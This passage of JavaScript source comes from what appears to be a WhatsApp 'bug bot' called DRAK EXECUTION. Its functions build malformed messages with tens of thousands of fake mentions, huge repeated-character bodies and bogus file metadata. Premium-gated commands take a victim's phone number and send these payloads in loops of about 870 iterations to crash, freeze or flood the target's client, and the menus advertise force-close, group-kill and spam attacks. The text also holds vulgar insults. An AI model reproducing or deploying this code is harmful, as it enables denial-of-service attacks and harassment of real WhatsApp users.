            "body": {
              "text": "Kontol " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🐉 ) Flixce Strom V2.0 ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await PalRyz.relayMessage(isTarget, carousel.message, {
      messageId: carousel.key.id
    });
    console.log("flixce Sending Carousel New !!");
  }
}
        
// Func Buldozer
async function bulldozerv1(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await PalRyz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

// Func Delay Sticker
async function DelayStc(langgxyz, isTarget) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: isTarget,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await PalRyz.relayMessage(isTarget, stickerMsg.message, { messageId: stickerMsg.key.id });
}


// Send Pairing
async function SendPairing(isTarget, Ptcp = false) {
  const messageContent = {
    viewOnceMessage: {
      message: {
        nativeFlowResponseMessage: {
          status: true,
          criador: "VenomMods",
          resultado: JSON.stringify({
            type: "md",
            ws: {
              _events: {
                "CB:ib,,dirty": ["Array"]
              },
              _eventsCount: 20,
              _maxListeners: 0,
              url: "wss://web.whatsapp.com/ws/chat",
              config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                connectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: "authData",
                markOnlineOnConnect: true,
                syncFullHistory: false,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: "transactionOptsData",
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: "appStateMacData",
                mobile: false
              }
            }
          }, null, 2) // JSON stringified for pretty format
        }
      }
    }
  };

  try {
    await PalRyz.relayMessage(isTarget, messageContent, Ptcp ? {
      participant: {
        jid: isTarget
      }
    } : {});
    console.log("Success Send Pairing to Target");
  } catch (error) {
    console.error("Failed to send Pairing to Target:", error);
  }
}


async function SockMentionJid3(target, Ptcp = false) {
      await PalRyz.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "༑⃟𝗜༑⃟Kntija☇peler༑bnz༑⃐⃐⃐ㇱ-" + "@0".repeat(90000),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 15000,
                  },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " target ",
              conversionData: "",
              conversionDelaySeconds: 10,
              forwardingScore: 9999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: " target ",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg",
                caption: " target ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "\u0000",
                body: "\u0000",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: "https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg",
                sourceType: " target ",
                sourceId: " target ",
                sourceUrl: "https://www.facebook.com/WhatsApp",
                mediaUrl: "https://www.facebook.com/WhatsApp",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.facebook.com/WhatsApp",
              },
              groupSubject: " target ",
              parentGroupJid: "120363321780343299-0@g.us",
              trustBannerType: " target ",
              trustBannerAction: 1,
              isSampled: true,
              utm: {
                utmSource: " target ",
                utmCampaign: " target ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299-0@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
    
 async function BaccaratUi(langgxyz, target) {
  await PalRyz.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "9999999999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙲𝚁𝙰𝚂𝙷𝙴𝚁.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: "Hi.... Im Baccarat Of Teenager",
              hasMediaAttachment: true,
            },
            body: {
              text:
                "ꦽ".repeat(50000) +
                "_*~@8~*_\n".repeat(50000) +
                "@8".repeat(50000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "anjay" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}

async function CosmoBlankX(target) {
  const Hytam = '_*~@2~*_\n'.repeat(10500);
  const Legam = 'ꦽ'.repeat(10000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "\u0000",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '༑Kontol⍣᳟Bapakkaupecah꙳⟅🩸' + Hytam + Legam,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Hades Document Killer",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await PalRyz.relayMessage(target, message, { participant: { jid: target } });
}

async function ProtoXAudio(target, mention) {
    console.log("Attack DelayProto Berjalann...")
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await PalRyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await PalRyz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "CikssXyz Is Heree Baybyy" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
//======================
switch (command) {
//case bug
case "Paldelay": {

if (!isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);

target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

m.reply(`*𝗕𝗨𝗚 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧*`); 

          for (let i = 0; i < 870; i++) {
            await carouselNew(target)
            await bulldozer(target)
            await carouselNew(target)
            await bulldozer(target)
            await DelayStc(langgxyz, target)
            await DelayStc(langgxyz, target)
            await carouselNew(target)
            await bulldozer(target)
            await carouselNew(target)
            await bulldozer(target)
            await DelayStc(langgxyz, target)
            await DelayStc(langgxyz, target)       
            await SockMentionJid3(target, false)
            await SockMentionJid3(target, false)
            await SockMentionJid3(target, false)
            await BaccaratUi(langgxyz, target)
            await BaccaratUi(langgxyz, target)
            await BaccaratUi(langgxyz, target)
            await CosmoBlankX(target) 
            await CosmoBlankX(target) 
            await CosmoBlankX(target) 
            await CosmoBlankX(target)
        }

    }

  

break;
//======================
case "Paldelayv2": {
    
if (!isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*𝗕𝗨𝗚 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧*`); 
          for (let i = 0; i < 879; i++) {
            await protocolbug2(target, true)
            await protocolbug1(target, true) 
            await protocolbug2(target, true)
            await protocolbug3(target, true)
            await protocolbug4(target, true)
            await VampPaymentCrash(target, true)
            await protocolbug5v2(target, true)
            await protocolbug5v2(target, true)
            await protocolbug5v2(target, false)
            await protocolbug5v2(target, false)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await VampDelayMess(langgxyz, target)
            await VampPrivateBlank(langgxyz, target)
            await VampDelayCrash(langgxyz, target)
            await VampBroadcast(langgxyz, target, true)
            await mentionSw(target)
            await carouselNew(target)
        }
    }
  
break;
//======================
case "buldozere": {
    
if (!isPremium) return m.reply('Khusus Premium');
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*𝗕𝗨𝗚 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧*`); 
          for (let i = 0; i < 879; i++) {
            await bulldozer(target);
            await bulldozer(target);
            await bulldozer(target);
            await bulldozer(target);
        }
    }
  
break;
//======================
case "delaysystem": {
    
if (!isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*𝗕𝗨𝗚 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧*`); 
          for (let i = 0; i < 879; i++) {
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
        }

    }
  
break;

case "combo-pow": {
    
if (!isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*𝗕𝗨𝗚 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧*`); 
          for (let i = 0; i < 879; i++) {
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
        }

    }
  
break;
//======================
case 'public': {
if (!isCreator) return m.reply(mess.owner) 
if (PalRyz.public === true) return m.reply("Dari tadi udh public njr🤓");
PalRyz.public = true
m.reply(mess.succes)
}
break
//======================
case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (PalRyz.public === false) return m.reply("Dari tadi udh self njr🤓");
PalRyz.public = false
m.reply(mess.succes)
}
break
//======================
case "menu": {
  let senderName = '@' + m.sender.split('@')[0];
  let captionText = `
\`\`\`TEAM
(🩸) - 情報 Olaa ${senderName} THE DRAK EXECUTION 
Telegram ─ WhatsApp ボットは、速く柔軟で安全な自動化ツール。\`\`\`

╭─[𖣘] 𝐁‌𝗢𝗧 𝗜𝗡𝗙𝗢 ]──≽
│• NAME : DRAK EXECUTION
│• VERSION : 2.5 Fase 1
╰────────────────≽
╭─[𖣘] 𝗜𝗡𝗙𝗢 𝗦𝗧𝗔𝗧𝗨𝗦 ]─≽
│  NAME BOT : DRAK EXECUTION
│  CREATOR : @PalRyz
│  VERSI BOT : V2.5 Fase 1
│  OWNER : ${isCreator ? 'true' : 'false'}
│  PREMIUM : ${isPremium ? 'true' : 'false'}
╰────────────────≽

⚡𝙎𝙃𝙊𝙒 𝘾𝙇𝙄𝘾𝙆 𝙏𝙃𝙀 𝘽𝙐𝙏𝙏𝙊𝙉.
`;

  const videoBuffer = await getBuffer("https://raw.githubusercontent.com/Nazir99inf/database/main/uploads/1751954128166.mp4");

  await PalRyz.sendMessage(m.chat, {
    video: videoBuffer,
    caption: captionText,
    mimetype: 'video/mp4',
    fileName: 'menu-video.mp4',
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 9999,
      isForwarded: true,
      externalAdReply: {
        title: `𝐃𝐀𝐑𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍`,
        body: `© PalRyz New Era`,
        thumbnailUrl: "https://img1.pixhost.to/images/6956/618392462_imgtmp.jpg",
        sourceUrl: `https://wa.me/6289526842547`,
        mediaType: 2,
        renderLargerThumbnail: true
      }
    },
    buttons: [
      { buttonId: `.bugmenu`, buttonText: { displayText: '⧼ 𝐁͢𝐮͡𝐠⍣𝐌͜𝐞͢𝐧͡𝐮⟆ ⧽' }, type: 1 },
      { buttonId: `.ownermenu`, buttonText: { displayText: '⧼ 𝐎͢𝐰͡𝐧͜𝐞͢𝐫𝐌͜𝐞͢𝐧͡𝐮⟆ ⧽' }, type: 1 },
      { buttonId: `.owner`, buttonText: { displayText: '⧼ 𝐎͡𝐰⍣𝐧𝐞͜𝐫⟆ ⧽' }, type: 1 },
      { buttonId: `.tqto`, buttonText: { displayText: '⧼ 𝐓⍣𝐐𝐓𝐎 ⧽' }, type: 1 }
    ],
    headerType: 4
  }, { quoted: qkontak });

  const soundList = [
    "https://raw.githubusercontent.com/Nazir99inf/database/main/uploads/1751203656275.mp3",
    "https://raw.githubusercontent.com/Nazir99inf/database/main/uploads/1751450806354.mp3",
    "https://raw.githubusercontent.com/Nazir99inf/database/main/uploads/1751460846206.mp3",
    "https://raw.githubusercontent.com/Nazir99inf/database/main/uploads/1751375723339.mp3"
  ];
  const randomSound = soundList[Math.floor(Math.random() * soundList.length)];

  await PalRyz.sendMessage(m.chat, {
    audio: { url: randomSound },
    mimetype: 'audio/mp4',
    ptt: true
  }, { quoted: palaj });
}
break;

case "bugmenu": {
    let senderName = '@' + m.sender.split('@')[0];
    let itsmenu = 
  `
  \`\`\`TEAM
(🩸) - 情報 Olaa ${senderName} THE DRAK EXECUTION 
Telegram ─ WhatsApp ボットは、速く柔軟で安全な自動化ツール。\`\`\`

╭─[𖣘] 𝐁‌𝗢𝗧 𝗜𝗡𝗙𝗢 ]──≽
│• NAME : DRAK EXECUTION
│• VERSION : 2.5 Fase 1
╰────────────────≽
╭─[𖣘] 𝗜𝗡𝗙𝗢 𝗦𝗧𝗔𝗧𝗨𝗦 ]─≽
│  NAME BOT : DRAK EXECUTION
│  CREATOR : @PalRyz
│  VERSI BOT : V2.5 Fase 1
│  OWNER : ${isCreator ? 'true' : 'false'}
│  PREMIUM : ${isPremium ? 'true' : 'false'}
╰────────────────≽

╭━≽「 𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘 」
┃ ┏━━━❐
┃ ⧎ .force-close
┃ ⧎ .force-beta
┃ ⧎ .force-andro
┃ ⧎ .pal-ios
┃ ⧎ .fc [628xx]
┃ ┗━━━━━━━━❏
╰══════════════❍

╭━≽「 𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘 𝗜𝗡𝗩𝗜𝗦 」
┃ ┏━━━❐
┃ ⧎ .pal-force
┃ ⧎ .fc-wak
┃ ⧎ .fc-palryz
┃ ┗━━━━━━━━❏
╰══════════════❍

╭━≽「 𝗕𝗨𝗚 𝗗𝗘𝗟𝗔𝗬 」
┃ ┏━━━❐
┃ ⧎ .delaymedium
┃ ⧎ .delayinvis
┃ ⧎ .delayhard
┃ ⧎ .Paldelay
┃ ⧎ .Paldelayv2
┃ ⧎ .buldozere
┃ ⧎ .delaysystem
┃ ⧎ .combo-pow
┃ ┗━━━━━━━━❏
╰══════════════❍

╭━≽「 𝗕𝗨𝗚 𝗚𝗥𝗢𝗨𝗣 」
┃ ┏━━━❐
┃ ⧎ .gckill dalem group 
┃ ⧎ .killgc dalem group 
┃ ⧎ .delaygc dalem group 
┃ ⧎ .gckill2 pake link
┃ ⧎ .killgc2 pake link
┃ ⧎ .delaygc2 pake link
┃ ┗━━━━━━━━❏
╰══════════════❍

╭━≽「 𝗕𝗨𝗚 𝗖𝗛 」
┃ ┏━━━❐
┃ ⧎ .killch
┃ ⧎ .pal-ch
┃ ⧎ .palryz-ch 
┃ ┗━━━━━━━━❏
╰══════════════❍

╭━≽「 𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘 𝗜𝗡𝗩𝗜𝗦 」
┃ ┏━━━❐
┃ ⧎ .sepongkuota
┃ ⧎ .bulldozer
┃ ⧎ .delaydozer
┃ ┗━━━━━━━━❏
╰══════════════❍

╭━≽「 SPAM MODE 」
┃ ┏━━━━━❐
┃ ⧎ .Spampairing 
┃ ⧎ .Spamreactch 
┃ ⧎ .Tagswgc 
┃ ⧎ .stelp
┃ ┗━━━━━━━━━━❏
╰════════════════❍

> 🔥 *Drak Execution System Ready*`;

    await PalRyz.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/6956/618392462_imgtmp.jpg" },
        caption: itsmenu,
        footer: 'Pilih tombol di bawah untuk lanjut back Menu',
        buttons: [
            { buttonId: '.menu', buttonText: { displayText: '𝐁͢𝐚͡𝐜⍣𝐤͜𝐌͢𝐞͡𝐧͡𝐮' }, type: 1 }
        ],
        headerType: 4
    }, { quoted: qkontak });

    await PalRyz.sendMessage(m.chat, {
        audio: { url: "https://raw.githubusercontent.com/Nazir99inf/database/main/uploads/1751434576903.mp3" },
        mimetype: 'audio/mpeg',
        ptt: true
    }, { quoted: palryz });
}
break;

case "ownermenu": {
    let senderName = '@' + m.sender.split('@')[0];
    let itsmenu = 
  `
  \`\`\`TEAM
(🩸) - 情報 Olaa ${senderName} THE DRAK EXECUTION 
Telegram ─ WhatsApp ボットは、速く柔軟で安全な自動化ツール。\`\`\`

╭─[𖣘] 𝐁‌𝗢𝗧 𝗜𝗡𝗙𝗢 ]──≽
│• NAME : DRAK EXECUTION
│• VERSION : 2.5 Fase 1
╰────────────────≽
╭─[𖣘] 𝗜𝗡𝗙𝗢 𝗦𝗧𝗔𝗧𝗨𝗦 ]─≽
│  NAME BOT : DRAK EXECUTION
│  CREATOR : @PalRyz
│  VERSI BOT : V2.5 Fase 1
│  OWNER : ${isCreator ? 'true' : 'false'}
│  PREMIUM : ${isPremium ? 'true' : 'false'}
╰────────────────≽

╭━≽「 AKSES OWNER 」
┃ ┏━━━━━❐
┃ ⧎ .Public
┃ ⧎ .Self
┃ ⧎ .Ddons [link]
┃ ⧎ .Addmurbug [628xx]
┃ ⧎ .Delmurbug [628xx]
